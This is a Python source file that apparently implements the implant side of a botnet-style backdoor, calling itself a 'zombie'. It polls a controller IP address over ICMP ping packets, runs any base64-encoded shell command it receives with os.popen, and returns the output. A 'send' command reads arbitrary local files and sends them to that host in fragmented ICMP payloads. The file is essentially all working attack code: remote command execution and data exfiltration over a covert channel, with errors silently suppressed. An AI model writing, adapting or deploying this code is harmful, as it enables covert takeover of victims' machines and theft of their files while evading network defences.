import os
import base64
import time
from scapy.all import *
from multiprocessing import Process

IP_ADDRESS = 'ip_ address'
KEEP_ALIVE_MESSAGE = "i'm a zombie"
FRAGMENT_SIZE = 1300
ICMP_ID = 1
SEND_FILE = b'file!'

def parse_command(command):
    if command == KEEP_ALIVE_MESSAGE:
        return
    elif command.startswith('send'):
        filename = command[5:]
        send_file(filename)
        return None
    else:
        return os.popen(command).read()


def send_file(filename):
    try:
        with open(filename, 'rb') as file:
            file_data = file.read()
            fragments = fragment_data(file_data)
            file_header = SEND_FILE + filename.encode('utf-8') + b' '
            for i, fragment in enumerate(fragments):
                packet = encode_data(file_header + fragment)
                response = make_icmp_response(packet)
                if i > 0:
                    response.flags = 'MF'
                time.sleep(0.02)
                send(response)
    except:
        pass


def make_icmp_response(payload):
    response = IP(dst=IP_ADDRESS, ttl=64)/ICMP(type=8,id=ICMP_ID)/Raw(load=payload)
    return response


def encode_data(data):
    encoded = base64.b64encode(data)
    return encoded


def decode_data(data):
    decoded = base64.b64decode(data)
    return decoded


def fragment_data(data):
    fragments = [data[i:i+FRAGMENT_SIZE]
                 for i in range(0, len(data), FRAGMENT_SIZE)]
    return fragments


def handle_icmp_reply(pkt):
    try:
        if IP in pkt and ICMP in pkt and pkt[IP].src == IP_ADDRESS:
            payload = extract_payload(pkt)
            command = decode_data(payload).decode('utf-8')
            response_data = parse_command(command)
            if response_data:
                fragments = fragment_data(response_data.encode('utf-8'))
                for i, fragment in enumerate(fragments):
                    response = make_icmp_response(encode_data(fragment))
                    if i > 0:
                        response.flags = 'MF'
                    send(response)
    except:
        pass

def extract_payload(pkt):
    payload = pkt[0][Raw].load
    return payload


def start_sniffer():
    sniff(prn=handle_icmp_reply, filter='icmp[0]=0', store=0)


def send_keepalive():
    while True:
        try:
            response = make_icmp_response(encode_data(
                KEEP_ALIVE_MESSAGE.encode('utf-8')))
            send(response)
            time.sleep(15)
        except KeyboardInterrupt:
            break


def run():
    sniffer_process = Process(target=start_sniffer)
    sniffer_process.start()
    keepalive_process = Process(target=send_keepalive)
    keepalive_process.start()
    try:
        keepalive_process.join()
    except KeyboardInterrupt:
        sniffer_process.terminate()
        keepalive_process.terminate()
    finally:
        sniffer_process.join()


if __name__ == '__main__':
    run()
